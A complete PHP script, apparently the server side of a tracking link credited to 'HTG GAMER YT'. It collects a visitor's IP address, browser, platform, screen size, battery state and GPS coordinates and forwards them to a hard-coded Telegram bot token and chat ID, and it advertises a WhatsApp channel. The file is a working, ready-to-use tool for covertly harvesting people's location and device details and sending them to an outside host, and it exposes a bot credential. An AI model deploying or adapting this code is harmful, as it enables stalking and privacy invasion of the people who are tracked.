<?php
// Telegram bot details
$telegramBotToken = "7791115392:AAGjSj-5y568LTXsY-GClzEmGYRdgFGU7jE";
$telegramChatId = "1244129628";

// Capture the raw POST data
$input = file_get_contents("php://input");
$data = json_decode($input, true);

// Prepare message with device information and credits
$message = "--- Device Information Received ---\n";
$message .= "IP Address      : " . $_SERVER['REMOTE_ADDR'] . "\n";
$message .= "Browser         : " . ($data['browser'] ?? 'N/A') . "\n";
$message .= "Platform        : " . ($data['platform'] ?? 'N/A') . "\n";
$message .= "Screen Width    : " . ($data['screenWidth'] ?? 'N/A') . "\n";
$message .= "Screen Height   : " . ($data['screenHeight'] ?? 'N/A') . "\n";
$message .= "Battery Level   : " . ($data['battery'] ?? 'N/A') . "\n";
$message .= "Is Charging     : " . ($data['isCharging'] ?? 'N/A') . "\n";
$message .= "Location        : " . (is_array($data['location']) ? "Lat: {$data['location']['latitude']}, Long: {$data['location']['longitude']}" : $data['location']) . "\n";
$message .= "Server Time     : " . date("Y-m-d H:i:s") . "\n\n";

// Add copyright and channel link
$message .= "--- Admin: HTG GAMER YT ---\n";
$message .= "📺 [CLICK HERE](https://whatsapp.com/channel/0029VaGL74T4dTnIkHKVW21c) to visit our Whatsapp channel!\n";

// Send to Telegram
$telegramApiUrl = "https://api.telegram.org/bot$telegramBotToken/sendMessage";
$postData = [
    'chat_id' => $telegramChatId,
    'text' => $message,
    'parse_mode' => 'Markdown' // Enable Markdown for clickable link
];

$options = [
    'http' => [
        'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
        'method'  => 'POST',
        'content' => http_build_query($postData),
    ],
];

$context  = stream_context_create($options);
$result = file_get_contents($telegramApiUrl, false, $context);

if ($result === FALSE) {
    echo json_encode(["status" => "error", "message" => "Failed to send data to Telegram."]);
} else {
    echo json_encode(["status" => "success", "message" => "Device details sent to Telegram."]);
}
?>
